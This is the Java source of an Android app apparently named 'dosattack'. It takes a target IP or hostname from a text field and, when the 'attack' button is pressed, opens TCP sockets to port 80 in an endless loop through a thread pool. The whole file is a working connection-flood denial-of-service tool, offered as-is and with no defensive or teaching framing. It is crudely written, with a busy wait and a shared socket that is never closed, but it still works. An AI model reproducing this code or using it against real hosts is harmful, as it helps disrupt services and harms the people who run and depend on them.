package com.example.nahomnegussie.dosattack;

import android.net.Uri;
import android.os.AsyncTask;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;

import com.google.android.gms.appindexing.Action;
import com.google.android.gms.appindexing.AppIndex;
import com.google.android.gms.appindexing.Thing;
import com.google.android.gms.common.api.GoogleApiClient;

import java.io.IOException;
import java.net.InetAddress;
import java.net.Socket;
import java.net.UnknownHostException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class MainActivity extends AppCompatActivity {
    EditText editText;
    Button btAttack;



    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        editText = (EditText) findViewById(R.id.etIp);
        btAttack = (Button) findViewById(R.id.btAttack);
        btAttack.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                new AttackAsynk().execute();
            }
        });

    }







    private class AttackAsynk extends AsyncTask<Void, Void, Void> {
        Socket socket;
        @Override
        protected void onPreExecute() {
            super.onPreExecute();
        }

        @Override
        protected Void doInBackground(Void... params) {
            boolean running=true;
            while (running) {
                attack();
            }


            return null;
        }

        private void attack() {
            ExecutorService executorService=Executors.newFixedThreadPool(256);
            executorService.execute(new Runnable() {
                @Override
                public void run() {
                    try {
                        socket = new Socket(InetAddress.getByName(editText.getText().toString()), 80);


                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }
            });
            executorService.shutdown();
            while(!executorService.isTerminated()){

            }
            System.out.println("finished now"+editText.getText().toString());
        }
    }
}
